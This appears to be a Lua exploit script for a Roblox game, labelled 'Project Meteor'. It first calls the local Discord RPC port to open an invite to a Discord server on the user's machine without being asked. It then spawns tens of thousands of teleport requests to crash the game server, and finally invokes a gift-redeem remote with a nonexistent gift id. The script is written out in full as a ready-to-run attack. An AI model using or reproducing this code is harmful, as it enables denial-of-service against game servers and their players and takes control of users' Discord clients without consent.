if not getgenv().packets then -- Add packets if not found
    getgenv().packets = 32000
end

function redirectdsc() -- redirect discord function
    if syn then
       syn.request({
          Url = "http://127.0.0.1:6463/rpc?v=1",
          Method = "POST",
          Headers = {
              ["Content-Type"] = "application/json",
              ["Origin"] = "https://discord.com"
          },
          Body = game:GetService("HttpService"):JSONEncode({
              cmd = "INVITE_BROWSER",
              args = {
                  code = "rGdF4Y9uza"
              },
              nonce = game:GetService("HttpService"):GenerateGUID(false)
          }),
       })
       
     elseif request then
       request({
           Url = 'http://127.0.0.1:6463/rpc?v=1',
           Method = 'POST',
           Headers = {
               ["Content-Type"] = "application/json",
               ["Origin"] = "https://discord.com"
           },
           Body = game:GetService("HttpService"):JSONEncode({
               cmd = "INVITE_BROWSER",
               args = {
                   code = "rGdF4Y9uza"
               },
               nonce = game:GetService("HttpService"):GenerateGUID(false)
           }),
       })
   end
end
local packetsended = 0
redirectdsc() -- fire redirectdsc function


Libreria = require(game:GetService('ReplicatedStorage').Framework.Library) -- get game library
function Crashear() -- do crash
    spawn(function()
        Libreria.Network.Fire('request world', "Fantasy") -- select world u want to go
        Libreria.Network.Fire('performed teleport') -- start teleport
        packetsended = packetsended + 1
        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
    end)
    spawn(function()
        Libreria.Network.Fire('request world', "Tech") -- same as the first
        Libreria.Network.Fire('performed teleport')
        packetsended = packetsended + 1
        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
    end)
    spawn(function()
        Libreria.Network.Fire('request world', "Void") -- same as the first
        Libreria.Network.Fire('performed teleport')
        packetsended = packetsended + 1
        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
    end)
    spawn(function()
        Libreria.Network.Fire('request world', "Axolot") -- same as the first
        Libreria.Network.Fire('performed teleport')
        packetsended = packetsended + 1
        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
    end)
end

local packetstosend = getgenv().packets / 4 -- A crash function is 4 packets, its why i do / 4
for i=1,packetstosend do -- Repeat the crash function packetstosend times
    spawn(Crashear)
end

local tabla = { -- select gift 13 (Dont exist)
	[1] = 13
}

workspace.__THINGS.__REMOTES["redeem free gift"]:InvokeServer(tabla) -- open gift selected in the list
